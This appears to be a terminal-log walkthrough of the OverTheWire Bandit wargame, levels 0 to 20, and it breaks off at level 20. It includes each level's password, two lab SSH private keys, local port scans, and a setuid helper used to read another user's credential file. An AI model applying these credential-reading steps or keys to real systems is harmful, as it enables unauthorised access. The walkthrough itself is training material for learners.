# OTW-Bandit-temp

## Bandit0

```bash
bandit0@bandit$ ls
readme
bandit0@bandit$ cat readme 
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
bandit0@bandit$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```
 
## bandit1  

```bash
bandit1@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
bandit1@bandit$ ls
.
bandit1@bandit$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9  
bandit1@bandit$ logout  
Connection to bandit.labs.overthewire.org closed.
```

## bandit2

```bash
bandit2@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit2@bandit.labs.overthewire.orgs password:

bandit2@bandit $ ls
spaces in this filename

bandit2@bandit $ cat spaces\ in\ this\ filename 
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

bandit2@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```
 

## bandit3

```bash
bandit3@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit3@bandit.labs.overthewire.orgs password:

bandit3@bandit $ ls
inhere

bandit3@bandit $ cd inhere/
bandit3@bandit:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Oct 16  2018 .
drwxr-xr-x 3 root    root    4096 Oct 16  2018 ..
-rw-r----- 1 bandit4 bandit3   33 Oct 16  2018 .hidden

bandit3@bandit:~/inhere$ cat .hidden 
pIwrPrtPN36QITSp3EQaw936yaFoFgAB

bandit3@bandit:~/inhere$ logout
Connection to bandit.labs.overthewire.org closed.
```

## Bandit4

```bash
/wargames/overthewire/bandit$ bandit4@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit4@bandit.labs.overthewire.orgs password:


bandit4@bandit $ ls -la
total 24
drwxr-xr-x  3 root root 4096 Oct 16  2018 .
drwxr-xr-x 41 root root 4096 Oct 16  2018 ..
-rw-r--r--  1 root root  220 May 15  2017 .bash_logout
-rw-r--r--  1 root root 3526 May 15  2017 .bashrc
drwxr-xr-x  2 root root 4096 Oct 16  2018 inhere
-rw-r--r--  1 root root  675 May 15  2017 .profile

bandit4@bandit $ cd inhere/
bandit4@bandit:~/inhere$ ls -la
total 48
drwxr-xr-x 2 root    root    4096 Oct 16  2018 .
drwxr-xr-x 3 root    root    4096 Oct 16  2018 ..
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file00
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file01
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file02
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file03
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file04
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file05
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file06
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file07
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file08
-rw-r----- 1 bandit5 bandit4   33 Oct 16  2018 -file09

bandit4@bandit:~/inhere$ cat ./-file0* | strings
w$N?c
ZP*E
koReBOKuIDDepwhWk7jZC0RTdopnAYKh

bandit4@bandit:~/inhere$ logout
Connection to bandit.labs.overthewire.org closed.
```
 

## bandit5

```bash
bandit5@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit5@bandit.labs.overthewire.orgs password:


bandit5@bandit $ ls
inhere
bandit5@bandit $ cd inhere/
bandit5@bandit:~/inhere$ ls -la
total 88
drwxr-x--- 22 root bandit5 4096 Oct 16  2018 .
drwxr-xr-x  3 root root    4096 Oct 16  2018 ..
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere00
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere01
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere02
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere03
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere04
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere05
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere06
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere07
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere08
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere09
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere10
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere11
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere12
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere13
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere14
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere15
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere16
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere17
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere18
drwxr-x---  2 root bandit5 4096 Oct 16  2018 maybehere19
bandit5@bandit:~/inhere$ find . -type f -readable ! -executable -size 1033c -exec cat {} \; | strings
DXjZPULLxYr17uwoI01bNLQbtFemEgo7

bandit5@bandit:~/inhere$ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit6

```bash
bandit6@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit6@bandit.labs.overthewire.orgs password:


bandit6@bandit $ ls -la
total 20
drwxr-xr-x  2 root root 4096 Oct 16  2018 .
drwxr-xr-x 41 root root 4096 Oct 16  2018 ..
-rw-r--r--  1 root root  220 May 15  2017 .bash_logout
-rw-r--r--  1 root root 3526 May 15  2017 .bashrc
-rw-r--r--  1 root root  675 May 15  2017 .profile
bandit6@bandit $ cd /
bandit6@bandit:/$ find . -size 33c -group bandit6 -user bandit7 2> /dev/null -exec cat {} \;
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

bandit6@bandit:/$ logout
Connection to bandit.labs.overthewire.org closed.
```
 
## bandit7

```bash
bandit7@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit7@bandit.labs.overthewire.orgs password:


bandit7@bandit $ ls -la
total 4108
drwxr-xr-x  2 root    root 4096 Oct 16  2018 .
drwxr-xr-x 41 root    root 4096 Oct 16  2018 ..
-rw-r--r--  1 root    root  220 May 15  2017 .bash_logout
-rw-r--r--  1 root    root 3526 May 15  2017 .bashrc
-rw-r-----  1 bandit8 bandit7 4184396 Oct 16  2018 data.txt
-rw-r--r--  1 root    root  675 May 15  2017 .profile
bandit7@bandit $ grep millionth data.txt 
millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV
bandit7@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```
 


## bandit8

```bash
bandit8@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no11:09:49 
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit8@bandit.labs.overthewire.orgs password:


bandit8@bandit $ ls -la
total 56
drwxr-xr-x  2 root    root     4096 Oct 16  2018 .
drwxr-xr-x 41 root    root     4096 Oct 16  2018 ..
-rw-r--r--  1 root    root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root    root     3526 May 15  2017 .bashrc
-rw-r-----  1 bandit9 bandit8 33033 Oct 16  2018 data.txt
-rw-r--r--  1 root    root      675 May 15  2017 .profile
bandit8@bandit $ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
bandit8@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```
 


## bandit9

```bash
bandit9@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit9@bandit.labs.overthewire.orgs password:


bandit9@bandit $ ls -la
total 40
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r-----  1 bandit10 bandit9 19379 Oct 16  2018 data.txt
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit9@bandit $ strings data.txt | grep '=='
2========== the
========== password
========== isa
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
bandit9@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit10

```bash
bandit10@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit10@bandit.labs.overthewire.orgs password:


bandit10@bandit $ ls -la
total 24
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r-----  1 bandit11 bandit10   69 Oct 16  2018 data.txt
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit10@bandit $ cat data.txt 
VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==
bandit10@bandit $ cat data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
bandit10@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```


## bandit11

```bash
bandit11@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit11@bandit.labs.overthewire.orgs password:


bandit11@bandit $ ls -la
total 24
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r-----  1 bandit12 bandit11   49 Oct 16  2018 data.txt
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit11@bandit $ cat data.txt 
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
bandit11@bandit $ cat data.txt |  tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
bandit11@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit12

```bash
bandit12@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit12@bandit.labs.overthewire.orgs password:



bandit12@bandit $ ls -la
total 24
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r-----  1 bandit13 bandit12 2581 Oct 16  2018 data.txt
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit12@bandit $ cat data.txt 
00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e  .......[..data2.
00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159  bin..<...BZh91AY
00000020: 2653 591d aae5 9800 001b ffff de7f 7fff  &SY.............
00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb  ................
00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c  ..............9.
00000050: 1006 8000 0000 0d06 9900 0000 6834 000d  ............h4..
00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034  .....z.........4
00000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200  ..24h..6..@.4.b.
00000080: 0069 a000 0000 0000 d003 d200 681a 0d00  .i..........h...
00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a  ...... ...mF.h..
000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06  h44...4.@.......
000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686  ....@2...C@h....
000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308  ... .........D..
000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13  ...B..,0....v;..
000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21  P.....;z.....s.!
000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330  .....+.f.......0
00000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b  `h.e..^....m...K
00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb  .l..5n.+.t..hY..
00000120: 0f9f 528e 4272 22bb 103c 2848 d8aa 2409  ..R.Br"..<(H..$.
00000130: 24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17  $...KBs..%l.~._.
00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823  ........g.zM.w.#
00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9  .P"2@...........
00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c  ..^-K........}.\
00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4  ,.....}E.F._!r..
00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed  U.g?E.i..9x.....
00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d  TB.@..l.......B.
000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a  F..hM.SC4.V.F...
000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef  r..sq.o..&@-..|.
000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b  S..`......9....[
000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c  j............F.<
000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d  j.I...T'.|..G.'.
000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69  ...\..W.QO4.p..i
00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df  ......S.#.&../..
00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96  ....#..<D.u..^_.
00000220: 481b 362e e82d 9093 7741 740c e65b c7f1  H.6..-..wAt..[..
00000230: 5550 f247 9043 5097 d626 3a16 da32 c213  UP.G.CP..&:..2..
00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12  *.).\.......H...
00000250: 03b5 5cb3 0037 cece 773c 0200 00   ..\..7..w<...
bandit12@bandit $ mkdir /tmp/esc
bandit12@bandit $ cd /tmp/esc
bandit12@bandit:/tmp/esc$ 
bandit12@bandit:/tmp/esc$ cp ~/data.txt data.hex
bandit12@bandit:/tmp/esc$ ls
data.hex
bandit12@bandit:/tmp/esc$ xxd -r data.hex >> reversedhex.out
bandit12@bandit:/tmp/esc$ file reversedhex.out 
reversedhex.out: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/esc$ zcat reversedhex.out > zcat_out.1
bandit12@bandit:/tmp/esc$ file zcat_out.1 
zcat_out.1: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/esc$ bzip2 -d zcat_out.1
bzip2: Cant guess original name for zcat_out.1 -- using zcat_out.1.out
bandit12@bandit:/tmp/esc$ file zcat_out.1.out 
zcat_out.1.out: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/esc$ zcat zcat_out.1.out > zcat_out.2
bandit12@bandit:/tmp/esc$ file zcat_out.2
zcat_out.2: POSIX tar archive (GNU)
bandit12@bandit:/tmp/esc$ tar xvf zcat_out.2
data5.bin
bandit12@bandit:/tmp/esc$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/esc$ tar xvf data5.bin
data6.bin
bandit12@bandit:/tmp/esc$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/esc$ bzip2 -d data6.bin
bzip2: Cant guess original name for data6.bin -- using data6.bin.out
bandit12@bandit:/tmp/esc$ file data6.bin.out 
data6.bin.out: POSIX tar archive (GNU)
bandit12@bandit:/tmp/esc$ tar xvf data6.bin.out
data8.bin
bandit12@bandit:/tmp/esc$ file data8.bin 
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/esc$ zcat data8.bin > zcat_out.3
bandit12@bandit:/tmp/esc$ file zcat_out.3
zcat_out.3: ASCII text
bandit12@bandit:/tmp/esc$ strings zcat_out.3
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
bandit12@bandit:/tmp/esc$ logout
Connection to bandit.labs.overthewire.org closed.

bandit12@bandit $ mkdir /tmp/esc
bandit12@bandit $ cd /tmp/esc
bandit12@bandit:/tmp/esc$ touch unpackhex.sh
bandit12@bandit:/tmp/esc$ chmod +x unpackhex.sh 
bandit12@bandit:/tmp/esc$ cp ~/data.txt data.hex
bandit12@bandit:/tmp/esc$ xxd -r data.hex >>  reversed.hex
bandit12@bandit:/tmp/esc$ vim unpackhex.sh
```

```bash
#bin/bash
# function to get filetype using file and cut
function get_file_type () {
  file $1 | cut -d " " -f 2
}
# function to match filetypes to correct command
function decompress () {
  FILETYPE=$(get_file_type $1)
  echo "[+] $1 matched to $FILETYPE filetype"
  if [ "$FILETYPE" != "ASCII" ]; then
    FILENAME="out_$RANDOM"
  fi
  if [ "$FILETYPE" = "gzip" ]; then
    zcat $1 > $FILENAME
  elif [ "$FILETYPE" = "bzip2" ]; then
    bzcat $1 > $FILENAME
  elif [ "$FILETYPE" = "POSIX" ]; then
    FILENAME=$(tar xvf $1)
  elif [ "$FILETYPE" = "ASCII" ]; then
    cat $FILENAME
    LOOP=0
  else
    echo "$FILETYPE is unknown"
  fi
  sleep 1
}
echo "[?] What file should we decompress? "
read FILENAME
LOOP=1
until [ $LOOP = 0 ]
do
  decompress $FILENAME
done
```

```bash
bandit12@bandit:/tmp/esc$ ./unpackhex.sh 
[?] What file should we decompress? 
reversed.hex
[+] reversed.hex matched to gzip filetype
[+] out_21267 matched to bzip2 filetype
[+] out_14023 matched to gzip filetype
[+] out_30556 matched to POSIX filetype
[+] data5.bin matched to POSIX filetype
[+] data6.bin matched to bzip2 filetype
[+] out_30902 matched to POSIX filetype
[+] data8.bin matched to gzip filetype
[+] out_14824 matched to ASCII filetype
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
bandit12@bandit:/tmp/esc$ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit13

```bash
bandit13@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit13@bandit.labs.overthewire.orgs password:



bandit13@bandit $ ls
sshkey.private
bandit13@bandit $ cat sshkey.private 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----
bandit13@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
 
/wargames/overthewire/bandit$ mkdir bandit14
/wargames/overthewire/bandit$ vim bandit14/id_rsa

* paste private key content here *

/wargames/overthewire/bandit$ chmod 0400
/wargames/overthewire/bandit$ bandit14@bandit.labs.overthewire.org -p 2220 -ibandit14/id_rsa
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames



bandit14@bandit $ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
bandit14@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit14

```bash
bandit14@bandit.labs.overthewire.org -p 2220 -i bandit14/id_rsa
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit14@bandit $ nc 127.0.0.1 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

bandit14@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit15

```bash
bandit15@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit15@bandit.labs.overthewire.orgs password:

bandit15@bandit $ openssl s_client --connect 127.0.0.1:30001 -quiet
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

bandit15@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit16

```bash
bandit16@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no 
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit16@bandit.labs.overthewire.orgs password:



bandit16@bandit $ nmap 127.0.0.1 -p 31000-32000

Starting Nmap 7.40 ( https://nmap.org ) at 2019-09-11 13:57 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00024s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
31518/tcp open  unknown
31790/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds


bandit16@bandit $ openssl s_client --connect 127.0.0.1:31518 -quiet
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
cluFn7wTiGryunymYOu4RcffSxQluehd
^C

bandit16@bandit $ openssl s_client --connect 127.0.0.1:31790 -quiet
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

bandit16@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit17

```bash
/wargames/overthewire/bandit$ mkdir bandit17
/wargames/overthewire/bandit$ vim bandit17/id_rsa 
/wargames/overthewire/bandit$ chmod 0400 bandit17/id_rsa
/wargames/overthewire/bandit$ bandit17@bandit.labs.overthewire.org -p 2220 -i bandit17/id_rsa 

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames 

bandit17@bandit $ ls
passwords.new  passwords.old
bandit17@bandit $ diff passwords.new passwords.old 
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> hlbSBPAWJmL6WFDb06gpTx1pPButblOA
bandit17@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit18

```bash
/wargames/overthewire/bandit$ bandit18@bandit.labs.overthewire.org -p 2220 ls
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.orgs password: 
readme
wargames/overthewire/banditbandit18@bandit.labs.overthewire.org -p 2220  cat readme
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.orgs password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

## bandit19

```bash
bandit19@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames 
 
bandit19@bandit.labs.overthewire.orgs password: 

bandit19@bandit $ ls
bandit20-do
bandit19@bandit $ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit $ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

## bandit20

```bash
bandit20@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit20@bandit.labs.overthewire.orgs password:




bandit20@bandit $ ls
suconnect

bandit20@bandit $ tmux
*CTRL+B SHIFT "*

bandit20@bandit:~$ ./suconnect 1337
